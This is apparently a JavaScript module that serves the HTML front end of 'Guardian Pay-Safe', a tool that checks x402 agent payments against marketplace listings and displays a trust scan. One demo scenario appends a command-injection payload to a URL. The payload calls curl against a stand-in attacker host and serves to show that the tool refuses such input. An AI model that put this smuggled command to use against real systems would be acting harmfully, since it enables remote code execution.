'use strict';

/**
 * GET /pay-safe: try Pay-Safe in a browser and read the OKX.AI marketplace trust scan.
 * Self-contained HTML. All data rendered from APIs goes through textContent, never innerHTML,
 * because challenge fields and listing names are attacker-controlled.
 */
function html() {
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Guardian Pay-Safe</title>
<meta name="description" content="Check an x402 payment before your agent pays it: price, payee, token, EIP-712 domain and endpoint against the marketplace listing.">
<style>
:root{--bg:#0b0d10;--card:#13171c;--line:#232a33;--txt:#e6e9ee;--muted:#8d96a3;--ok:#3ecf8e;--warn:#f5b849;--deny:#f0574f;--acc:#6aa9ff}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--txt);font:15px/1.55 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
.wrap{max-width:1040px;margin:0 auto;padding:32px 16px 64px}
h1{font-size:28px;margin:0 0 6px;letter-spacing:-.01em}h2{font-size:13px;margin:34px 0 12px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
.lead{color:var(--muted);margin:0 0 8px;max-width:760px}
.flow{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0 0;color:var(--muted);font-size:13px}.flow span{background:var(--card);border:1px solid var(--line);border-radius:999px;padding:4px 10px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px}
button.sc{all:unset;cursor:pointer;display:block;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:12px 14px}
button.sc:hover,button.sc:focus-visible{border-color:var(--acc)}
.sc .t{font-weight:600}.sc .s{color:var(--muted);font-size:13px;margin-top:4px}.sc .e{font-size:12px;margin-top:8px}
form{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;align-items:end}
label{display:block;font-size:12px;color:var(--muted);margin-bottom:4px}
input,select{width:100%;background:#0f1318;color:var(--txt);border:1px solid var(--line);border-radius:8px;padding:9px 10px;font:inherit;font-size:14px}
.wide{grid-column:1/-1}
.go{background:var(--acc);color:#081018;border:0;border-radius:8px;padding:10px 16px;font-weight:600;cursor:pointer;font-size:14px}
.go:disabled{opacity:.6;cursor:wait}
#result{margin-top:16px}
.verdict{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.badge{font-weight:700;font-size:20px;padding:4px 14px;border-radius:8px;border:1px solid currentColor}
.ALLOW{color:var(--ok)}.WARN{color:var(--warn)}.DENY{color:var(--deny)}.NONE{color:var(--muted)}
.sum{margin:10px 0 0}.muted{color:var(--muted)}
ul.f{list-style:none;padding:0;margin:12px 0 0}ul.f li{border-top:1px solid var(--line);padding:9px 0;font-size:14px;overflow-wrap:anywhere}
.code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px}
.sev{font-weight:600;margin-right:6px}
details{margin-top:10px}summary{cursor:pointer;color:var(--muted);font-size:13px}
pre{background:#0f1318;border:1px solid var(--line);border-radius:8px;padding:12px;overflow:auto;max-height:420px;font-size:12px}
.kpi .v{font-size:28px;font-weight:600}.kpi .k{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.06em}
a{color:var(--acc);text-decoration:none}a:hover{text-decoration:underline}
.foot{color:var(--muted);font-size:13px;margin-top:40px}
</style></head><body><div class="wrap">
<h1>Pay-Safe</h1>
<p class="lead">Check an x402 payment <strong>before</strong> your agent pays it. Guardian requests the paid endpoint once without paying, reads the 402 challenge and compares it with what the marketplace listing promised: price, token, payee, EIP-712 domain and endpoint. Nothing is signed or paid.</p>
<div class="flow"><span>1 · listing</span><span>2 · unpaid request</span><span>3 · verdict</span><span>4 · quote matches check</span><span>5 · wallet pays</span></div>

<h2>Try a seller</h2>
<div class="grid" id="scenarios"><div class="card muted">Loading demo sellers…</div></div>

<h2>Check any paid endpoint</h2>
<form id="custom" class="card">
  <div class="wide"><label for="url">Paid endpoint URL (https)</label><input id="url" name="url" placeholder="https://seller.example/paid/route" required></div>
  <div><label for="fee">Listed price</label><input id="fee" name="fee" placeholder="0.002" inputmode="decimal"></div>
  <div><label for="token">Listed token</label><input id="token" name="token" value="0x779ded0c9e1022225f8e0630b35a9b54be713736"></div>
  <div><label for="payto">Listed payee (optional)</label><input id="payto" name="payto" placeholder="0x…"></div>
  <div><label for="cap">Your spending cap (optional)</label><input id="cap" name="cap" placeholder="0.05" inputmode="decimal"></div>
  <div><label for="method">Request</label><select id="method" name="method"><option value="auto">auto (GET, POST, MCP)</option><option>GET</option><option>POST</option><option>MCP</option></select></div>
  <div><button class="go" type="submit" id="goBtn">Check payment</button></div>
</form>
<div id="result"></div>

<h2>OKX.AI marketplace trust scan</h2>
<p class="lead" id="scanLead">Loading…</p>
<div class="grid" id="scanKpi"></div>
<ul class="f card" id="scanFindings" style="margin-top:12px"></ul>

<p class="foot">API: <span class="code">POST /probe-payment</span> (URL in, verdict out) · <span class="code">POST /check-payment</span> (challenge in, verdict out) · <a href="/demo/x402">/demo/x402</a> · <a href="/trust-scan">/trust-scan</a> · <a href="/rules">/rules</a> · CLI for Onchain OS: <span class="code">node scripts/safe-pay.js --sid &lt;sid&gt;</span> · <a href="https://github.com/InkoStrategy/guardian-mcp">source</a></p>
</div>
<script>
(function(){
  function el(tag, cls, text){ var e=document.createElement(tag); if(cls) e.className=cls; if(text!==undefined&&text!==null) e.textContent=String(text); return e; }
  var result=document.getElementById('result');

  function render(r, label){
    result.textContent='';
    var card=el('div','card');
    var head=el('div','verdict');
    var v=r.verdict||'NONE';
    head.appendChild(el('span','badge '+v, r.verdict||'NO CHALLENGE'));
    if(label) head.appendChild(el('span','muted',label));
    if(typeof r.risk_score==='number') head.appendChild(el('span','muted','risk '+r.risk_score));
    card.appendChild(head);
    if(r.error){ card.appendChild(el('p','sum DENY',r.error)); result.appendChild(card); return; }
    card.appendChild(el('p','sum',r.summary||''));
    var d=r.details||{};
    if(d.probe) card.appendChild(el('p','muted', d.probe.contacted ? 'Challenge from '+d.probe.method+' (HTTP '+d.probe.status+'), nothing signed.' : 'Endpoint not contacted: '+(d.probe.reason||'')));
    var list=el('ul','f');
    (d.findings||[]).forEach(function(f){ var li=el('li'); li.appendChild(el('span','sev '+f.severity,f.severity)); li.appendChild(el('span','code',f.code)); li.appendChild(el('div','',f.message)); list.appendChild(li); });
    (r.recommendations||[]).forEach(function(x){ var li=el('li'); li.appendChild(el('span','sev','Do')); li.appendChild(el('span','',x.action)); list.appendChild(li); });
    if(list.childNodes.length) card.appendChild(list);
    var det=el('details'); det.appendChild(el('summary','','Raw response')); det.appendChild(el('pre','',JSON.stringify(r,null,2))); card.appendChild(det);
    result.appendChild(card);
  }

  async function probe(body, label, btn){
    if(btn) btn.disabled=true;
    result.textContent=''; result.appendChild(el('div','card muted','Requesting the endpoint without paying…'));
    try{
      var res=await fetch('/probe-payment',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body)});
      var j=await res.json();
      if(res.status!==200) j={error:j.error||('HTTP '+res.status)};
      render(j,label);
    }catch(e){ render({error:e.message},label); }
    finally{ if(btn) btn.disabled=false; result.scrollIntoView({behavior:'smooth',block:'nearest'}); }
  }

  fetch('/demo/x402').then(function(r){return r.json();}).then(function(c){
    var box=document.getElementById('scenarios'); box.textContent='';
    var items=c.scenarios.slice();
    var honest=items.find(function(s){return s.key==='honest';});
    if(honest) items.push({key:'shell-url',title:'Shell payload in the URL',story:'The listed endpoint URL itself carries ;id|{curl,…}. Guardian refuses to contact it.',expected_verdict:'DENY',endpoint:honest.endpoint+';id|{curl,-fsS,https://evil.example/rce}',listing:Object.assign({},honest.listing)});
    items.forEach(function(s){
      var b=el('button','sc'); b.type='button';
      b.appendChild(el('div','t',s.title)); b.appendChild(el('div','s',s.story)); b.appendChild(el('div','e '+s.expected_verdict,'expected '+s.expected_verdict));
      b.addEventListener('click',function(){ var listing=Object.assign({},s.listing,{endpoint:s.endpoint}); probe({url:s.endpoint,expected:listing,context:{max_amount:'0.05'}}, s.title, b); });
      box.appendChild(b);
    });
  }).catch(function(e){ document.getElementById('scenarios').textContent='Could not load demo sellers: '+e.message; });

  document.getElementById('custom').addEventListener('submit',function(ev){
    ev.preventDefault();
    var url=document.getElementById('url').value.trim();
    var expected={endpoint:url};
    var fee=document.getElementById('fee').value.trim(); if(fee) expected.feeAmount=fee;
    var token=document.getElementById('token').value.trim(); if(token) expected.feeToken=token;
    var payto=document.getElementById('payto').value.trim(); if(payto) expected.payTo=payto;
    var body={url:url,expected:expected,method:document.getElementById('method').value};
    var cap=document.getElementById('cap').value.trim(); if(cap) body.context={max_amount:cap};
    probe(body,url,document.getElementById('goBtn'));
  });

  fetch('/trust-scan').then(function(r){return r.json();}).then(function(s){
    var t=s.totals||{};
    document.getElementById('scanLead').textContent='Every paid A2MCP service found on OKX.AI, requested once without paying, checked against its own listing. Generated '+String(s.generatedAt||'').slice(0,16).replace('T',' ')+' UTC.';
    var k=document.getElementById('scanKpi');
    [['Paid services',t.services,''],['Returned a challenge',t.challenge,''],['ALLOW',t.allow,'ALLOW'],['WARN',t.warn,'WARN'],['DENY',t.deny,'DENY']].forEach(function(x){ var c=el('div','card kpi'); c.appendChild(el('div','k',x[0])); c.appendChild(el('div','v '+x[2],x[1])); k.appendChild(c); });
    var ul=document.getElementById('scanFindings');
    (s.results||[]).filter(function(r){return r.verdict&&r.verdict!=='ALLOW';}).forEach(function(r){
      (r.findings||[]).forEach(function(f){ var li=el('li'); li.appendChild(el('span','sev '+f.severity,f.severity)); li.appendChild(el('span','code',f.code)); li.appendChild(el('span','muted',' · '+r.service+' (sid '+r.sid+')')); li.appendChild(el('div','',f.message)); ul.appendChild(li); });
    });
    if(!ul.childNodes.length) ul.appendChild(el('li','muted','No findings.'));
  }).catch(function(e){ document.getElementById('scanLead').textContent='Could not load the scan: '+e.message; });
})();
</script></body></html>`;
}

module.exports = { html };
